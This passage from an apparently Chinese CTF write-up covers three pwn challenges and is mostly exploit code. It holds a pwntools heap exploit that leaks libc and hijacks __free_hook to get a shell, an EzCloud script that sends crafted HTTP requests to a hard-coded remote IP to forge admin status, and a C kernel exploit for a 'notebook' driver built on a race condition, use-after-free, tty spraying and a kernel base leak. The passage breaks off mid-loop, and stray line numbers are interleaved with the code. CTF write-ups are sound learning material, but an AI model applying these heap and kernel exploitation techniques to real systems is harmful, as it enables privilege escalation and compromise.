dele(2)
add(0xf8-1,'\x00' * 0xf7)
dele(2)
payload = b'\x03'
add(0xf8-1,payload.ljust(0xf0,b'\x00') + b'\n')
# payload = payload.str()[:0x30] + chr(de_check(payload,0)) + 
payload.str()[0x31:]
test_check(payload)
# input()
dele(3)
dele(1)
add(0xf8-1,'\x66' * 0x20 + '\n')
add(0xf8-1,'a\n')
show(1)
p.recvuntil('content: ')
leak_libc = u64(p.recv(6) + b'\x00\x00') - 2014176
log.info('leak libc ' + hex(leak_libc))
dele(4)
dele(2)
add(0x200,'/bin/sh\x00'  + 'a' * 0xf8 + p64(leak_libc + 
libc.symbols['__free_hook']).str() + '\n')
add(0xf8-1,p64(leak_libc + libc.symbols['system']).str() + '\n')
add(0xf8-1,p64(leak_libc + libc.symbols['system']).str() + '\n')
dele(2)
sleep(0.5)
p.sendline('cat flag')
p.interactive()
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
EzCloud
程序在 new 0 size 的时候存在数据未初始化漏洞
造成可以使⽤未初始化的数据操作
此时 edit ⼀个 content 指向另⼀个，此时另⼀个 content 的字段指针是堆地址
将其修改低字节指向 login 结构体（1/16 概率），改写身份为 admin:0x00000001 即可利⽤ getflag 功能获
得 flag
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
#p = process("./EzCloud",env={'LD_PRELOAD':"./libc-2.31.so"})
p=remote("47.94.234.66",37128)
def add(size,note):
  req = '''POST /notepad\r
Content-Length: %d\r
Login-ID: 233\r
Note-Operation: new%%20note\r
Content-Type: application/x-www-form-urlencoded\r\n\r
%s\r\n'''%(size, note)
  p.send(req.ljust(0x1000, "\x00"))
def edit(index, note):
  req = '''POST /notepad\r
Content-Length: %d\r
Login-ID: 233\r
Note-Operation: edit%%20note\r
Note-ID: %d\r
Content-Type: application/x-www-form-urlencoded\r\n\r
%s\r\n'''%(len(note), index, note)
  p.send(req)
def delete(index):
  req = '''POST /notepad\r
Login-ID: 233\r
Note-Operation: delete%%20note\r
Note-ID: %d\r
\r\n\r\n'''%(index)
  p.send(req)
def show(index):
  req = '''GET /notepad\r
Login-ID: 233\r
Note-Operation: delete%%20note\r
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
notebook
解题时间：⼀⾎ 12号5.30PM左右
在 add 和 edit 时候使⽤读锁，可以构造条件竞争构造出⼀个 size=0 的 chunk
delete size=0 的 note 可以造成 UAF
利⽤ UAF 攻击 tty 设备即可
Note-ID: %d\r
\r\n\r\n'''%(index)
  p.send(req)
def pause():
   p.recv()
#0x5555555624b0
#gdb.attach(p)
req1 = '''POST /login\r
Login-ID: 233\r\n\r\n'''
p.send(req1)
pause()
for i in range(10):
  add(0, "aaaa")
  pause()
print("[----------------------]")
add(0x20,"a"*0x20)
pause()
edit(5,"%b0%a4")
pause()
edit(7,"%01%00%00%00%00")
pause()
payload = '''GET /flag\r
Login-ID: 233\r\n\r\n'''
p.send(payload)
p.interactive()
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
#include 
#include 
#include 
#include 
#include 
1
2
3
4
5
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#define KERNCALL __attribute__((regparm(3)))
#define _GNU_SOURCE
size_t data[0x100];
int m_idx;
typedef struct userarg
{
  size_t idx;
  size_t size;
  void *buf;
} userarg;
int fd,fd2;
void shell(){
    system("/bin/sh");
}
void add(int fd,size_t idx,size_t size,char* buf){
  userarg magic;
  magic.idx = idx;
  magic.size = size;
  magic.buf = buf;
  ioctl(fd,0x100,&magic);
}
void delete(int fd,size_t idx){
  userarg magic;
  magic.idx = idx;
  ioctl(fd,0x200,&magic);
}
void edit(int fd,size_t idx,size_t size,char* buf){
  userarg magic;
  magic.idx = idx;
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
  magic.size = size;
  magic.buf = buf;
  ioctl(fd,0x300,&magic);
}
void gift(int fd,char* buf){
  userarg magic;
  magic.buf = buf;
  ioctl(fd,100,&magic);
}
void info(){
     for(int i=0;i<=20;i++){
     printf("%016llx  |  %016llx\n",data[2*i],data[2*i+1]);
     }
}
unsigned long user_cs, user_ss, user_eflags,user_sp ;
void save_status() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
        :
        : "memory"
    );
}
int flag;
void race(){
    while(flag){
     add(fd,1,0x120,data);
 }
}
int main(){
   save_status();
   signal(SIGSEGV, shell);
 //size_t* fake=mmap(0x2333000, 0x1000, PROT_READ | PROT_WRITE | 
PROT_EXEC,MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,0,0);
 //data = 0x2334000-0x400;
 printf("[+] data@ %p\n",data);
 fd = open("/dev/notebook",0);
 fd2 = open("/dev/notebook",1);
 int fd_tmp[64];
 for(int i=0;i<64;i++)
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
   fd_tmp[i]=open("/dev/ptmx",1);
 printf("[+] fd@ %d\n",fd);
 data[2]=0x2333;
 data[0]=0x2333;
 for(int i=0;i<15;i++)
    add(fd,i,0x10,data);
 //read(0,data,2);
 for(int i=0;i<64;i++)
   close(fd_tmp[i]);
 for(int i=0;i<15;i++)
   edit(fd,i,0x400,data);
 size_t kernel;
 for(int i=0;i<15;i++){
    read(fd,data,i);
    if((data[3]&0xfff)==0x440)
        break;
 }
 kernel = data[3] - 0x1e8e440;
 info();
 printf("[+] kernel base@ %p\n",kernel);
 for(int i=0;i<15;i++)
   delete(fd,i);
 for(int i=0;i<15;i++)
    add(fd,i,0x20,data);
 for(int i=0;i<15;i++)
    edit(fd,i,0x100,data);
 gift(fd,data);
 for(int i=0;i<14;i++)
   if (data[2*(i+1)]-data[2*i] == 0x100 )
       m_idx = i;
  printf("[+] magic_index@ %d\n",m_idx);
  printf("[+] magic @ %p\n",data[2*m_idx]);
  flag=1;
  //pthread_t t;
  //pthread_create(&t, NULL, (void*)race, NULL);
  data[32]=0x2333;
  int pid=fork();
  if(!pid){
    while(flag){
     add(fd,0,0x100,data);
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
     add(fd,0,0x100,data);
     add(fd,0,0x100,data);
     add(fd,0,0x100,data);
     add(fd,0,0x100,data);
    }
  }
  printf("[+] pid@ %d %d\n",pid);
  while(1){